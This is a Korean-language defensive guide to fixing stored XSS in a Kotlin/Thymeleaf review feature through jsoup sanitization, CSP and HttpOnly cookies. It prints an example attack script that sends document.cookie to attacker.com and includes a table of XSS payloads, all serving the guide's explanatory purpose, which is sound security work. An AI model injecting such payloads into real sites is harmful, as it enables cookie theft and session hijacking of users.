# 🛡️ XSS 방어 가이드

## ❌ 발견된 취약점

### 1. **th:utext 사용으로 인한 XSS 취약점**
```html
<!-- ❌ 위험 -->
<div th:utext="${review.content}">
```

**문제점:**
- 사용자가 `<script>alert('XSS')</script>` 입력 시 그대로 실행됨
- 쿠키 탈취, 세션 하이재킹 가능
- 다른 사용자에게도 영향 (Stored XSS)

**공격 시나리오:**
```javascript
// 악의적 사용자가 리뷰에 입력:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// 다른 사용자가 해당 리뷰를 볼 때마다 쿠키 탈취됨
```

---

## ✅ 적용된 보안 조치

### 1. **서버 사이드 HTML 새니타이즈 (jsoup)**

#### build.gradle.kts
```kotlin
implementation("org.jsoup:jsoup:1.17.2")
```

#### HtmlSanitizer.kt
```kotlin
object HtmlSanitizer {
    private val safelist = Safelist.relaxed()
        .addTags("h1", "h2", "h3", "h4", "h5", "h6")
        .addAttributes("p", "class")
        .addAttributes("span", "class")
        .addProtocols("a", "href", "http", "https", "mailto")

    fun sanitize(html: String?): String {
        if (html.isNullOrBlank()) return ""
        return Jsoup.clean(html, safelist)
    }

    fun toPlainText(html: String?): String {
        if (html.isNullOrBlank()) return ""
        return Jsoup.parse(html).text()
    }
}
```

**허용되는 태그:**
- 텍스트: `<p>`, `<strong>`, `<em>`, `<u>`, `<strike>`
- 제목: `<h1>` ~ `<h6>`
- 리스트: `<ul>`, `<ol>`, `<li>`
- 링크: `<a href="...">`
- 인용: `<blockquote>`
- 코드: `<code>`, `<pre>`

**차단되는 태그:**
- `<script>` - JavaScript 실행
- `<iframe>` - 외부 사이트 임베드
- `<object>`, `<embed>` - 플러그인 실행
- `onclick`, `onerror` 등 이벤트 핸들러

### 2. **ReviewService 수정**

```kotlin
fun createReview(review: Review): Review {
    val reviewNo = sequenceService.getNextSequence(SequenceNames.REVIEW_SEQ)
    
    // XSS 방지: 저장 전 새니타이즈
    val sanitizedReview = review.copy(
        reviewNo = reviewNo,
        title = HtmlSanitizer.toPlainText(review.title),      // HTML 제거
        content = HtmlSanitizer.sanitize(review.content),     // 안전한 HTML만 허용
        quote = HtmlSanitizer.toPlainText(review.quote)       // HTML 제거
    )
    
    return reviewRepository.save(sanitizedReview)
}

fun updateReview(...): Review? {
    // 수정 시에도 동일하게 새니타이즈
    val updated = review.copy(
        title = HtmlSanitizer.toPlainText(title),
        content = HtmlSanitizer.sanitize(content),
        quote = HtmlSanitizer.toPlainText(quote),
        ...
    )
    return reviewRepository.save(updated)
}
```

---

## 🔍 보안 레이어

### **다층 방어 (Defense in Depth)**

```
사용자 입력
    ↓
┌─────────────────────────────────┐
│ 1. 클라이언트 검증 (UX용)       │  ← 쉽게 우회 가능
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 2. 서버 검증 + HTML 새니타이즈  │  ✅ 핵심 방어선
│    (ReviewService)              │
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 3. 데이터베이스 저장             │  ← 이미 안전한 데이터
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 4. 렌더링 (th:utext)            │  ← 안전한 HTML만 존재
└─────────────────────────────────┘
```

---

## 🧪 테스트 케이스

### **악의적 입력 예시**

| 입력 | 새니타이즈 후 | 설명 |
|------|--------------|------|
| `<script>alert('XSS')</script>` | (제거됨) | 스크립트 차단 |
| `<img src=x onerror=alert('XSS')>` | `<img src="x">` | 이벤트 핸들러 제거 |
| `<a href="javascript:alert('XSS')">Click</a>` | `<a>Click</a>` | javascript: 프로토콜 차단 |
| `<p onclick="alert('XSS')">Text</p>` | `<p>Text</p>` | onclick 제거 |
| `<iframe src="https://evil.com"></iframe>` | (제거됨) | iframe 차단 |
| `<strong>Bold</strong>` | `<strong>Bold</strong>` | ✅ 안전한 태그 허용 |

---

## 📋 체크리스트

### ✅ **완료된 보안 조치**
- [x] jsoup 의존성 추가
- [x] HtmlSanitizer 유틸리티 생성
- [x] ReviewService에 새니타이즈 로직 추가
- [x] createReview에 적용
- [x] updateReview에 적용
- [x] UpdateReviewRequest에 quote 추가
- [x] ReviewController 수정

### ⚠️ **추가 권장 사항**

1. **CSP (Content Security Policy) 헤더 추가**
```kotlin
// SecurityConfig.kt
http.headers { headers ->
    headers.contentSecurityPolicy { csp ->
        csp.policyDirectives("default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.quilljs.com https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://cdn.quilljs.com;")
    }
}
```

2. **HttpOnly 쿠키 설정 확인**
```yaml
# application.yml
server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true  # HTTPS 환경에서
```

3. **Rate Limiting 추가**
```kotlin
// 리뷰 작성/수정 횟수 제한 (DoS 방지)
```

---

## 🎯 결론

### **적용 전 (취약)**
```kotlin
// 사용자 입력 그대로 저장
reviewRepository.save(review)
```
```html
<!-- 위험한 렌더링 -->
<div th:utext="${review.content}">
```

### **적용 후 (안전)**
```kotlin
// 저장 전 새니타이즈
val sanitized = review.copy(
    content = HtmlSanitizer.sanitize(review.content)
)
reviewRepository.save(sanitized)
```
```html
<!-- 이미 안전한 HTML이므로 th:utext 사용 가능 -->
<div th:utext="${review.content}">
```

**핵심 원칙:**
- ✅ 사용자 입력은 절대 신뢰하지 않는다
- ✅ 서버에서 검증/새니타이즈
- ✅ 다층 방어 전략
- ✅ 정기적인 보안 감사
